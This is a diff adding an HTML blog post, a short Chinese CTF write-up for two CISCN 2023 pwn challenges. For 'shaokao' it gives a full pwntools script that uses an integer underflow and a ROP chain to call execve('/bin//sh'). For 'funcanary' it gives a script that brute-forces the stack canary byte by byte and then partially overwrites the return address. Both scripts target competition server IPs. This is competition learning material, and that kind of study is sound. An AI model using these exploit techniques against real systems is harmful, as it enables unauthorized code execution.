@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('theme');
+        if (t === 'light' || t === 'dark') {
+          document.documentElement.setAttribute('data-theme', t);
+        }
+      } catch (e) {}
+    })();
+  </script>
+  <title>
+    
+    ciscn2023 pwn 宝宝题解 丨
+    
+
+    K&#39;s Map | DeePunk&#39;s Blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet">
+
+  
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+  <script defer src="/js/highlight.min.js"></script>
+  <script defer src="/js/image-zoom.js"></script>
+  <script defer src="/js/toc.js"></script>
+  
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="K's Map | DeePunk's Blog" type="application/atom+xml">
+</head>
+
+  <body>
+    <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">K&#39;s Map | DeePunk&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+      
+            <main class="main">
+              <article class="post">
+  
+  <div class="post-title">ciscn2023 pwn 宝宝题解</div>
+  <div class="post-meta">
+    <div class="date">2023 五月 29日</div>
+    <div class="tags">
+      
+      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
+      
+      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><blockquote>
+<p>坐牢了，只会做baby题</p>
+</blockquote>
+<h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>整型下溢，然后有个栈溢出，直接用ROPgadget生成ropchain</p>
+<p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p>
+<pre><code class="highlight python"><span class="comment">#!/usr/bin/env python2</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+
+context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)
+<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):
+	cmd += <span class="string">&quot;b main\n&quot;</span>
+	gdb.attach(p, cmd)
+	pause()
+
+host = <span class="string">&quot;123.56.251.120&quot;</span>
+port = <span class="number">36293</span>
+<span class="comment">#pl = process(&quot;./shaokao&quot;)</span>
+pl = remote(host,  port)
+
+<span class="comment"># debug()</span>
+pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)
+pl.sendline(<span class="string">&quot;1&quot;</span>)
+pl.recv()
+pl.sendline(<span class="string">&quot;1&quot;</span>)
+pl.recv()
+pl.sendline(<span class="string">&quot;-1145144&quot;</span>)
+pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)
+pl.sendline(<span class="string">&quot;4&quot;</span>)
+pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)
+pl.sendline(<span class="string">&quot;5&quot;</span>)
+pl.recv()
+
+
+p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span>
+
+p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span>
+p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span>
+p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span>
+p += <span class="string">b&#x27;/bin//sh&#x27;</span>
+p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span>
+p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span>
+p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span>
+p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span>
+p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span>
+p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span>
+p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span>
+p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span>
+p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span>
+p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span>
+p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span>
+p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span>
+p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span>
+p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span>
+pl.sendline(p)
+
+
+pl.interactive()</code></pre>
+
+
+
+<h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>fork子进程崩溃不改变canary,利用该性质逐字节爆破canary,发现后门函数，直接覆盖前两位地址，第三位直接猜</p>
+<p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p>
+<pre><code class="highlight python"><span class="comment">#!/usr/bin/env python2</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+
+context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)
+<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):
+	cmd += <span class="string">&quot;b main\n&quot;</span>
+	gdb.attach(p, cmd)
+	pause()
+
+host = <span class="string">&quot;123.57.248.214&quot;</span>
+port = <span class="number">25775</span>
+<span class="comment">#pt = process(&quot;./funcanary&quot;)</span>
+pt = remote(host, port)
+
+pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)
+canary = <span class="string">&#x27;\x00&#x27;</span>
+<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):
+    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):
+        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)
+        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))
+        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)
+        <span class="built_in">print</span> a
+        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:
+                canary += <span class="built_in">chr</span>(i)
+                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary
+                <span class="keyword">break</span>
+<span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary
+
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span>
+pt.send(pyload)
+pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary 
+pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span>
+pt.send(pyload)
+
+
+pt.interactive()</code></pre>
+</main>
+
+  
+</article>
+            </main>
+            
+              <footer class="footer">
+  
+  <span>Copyright © 2021 DeePunk</span>
+  
+</footer>
+
+<button id="theme-toggle" type="button" aria-label="切换主题">☾</button>
+                
+<script src="/js/theme.js"></script>
+
+  </body>
+
+</html>
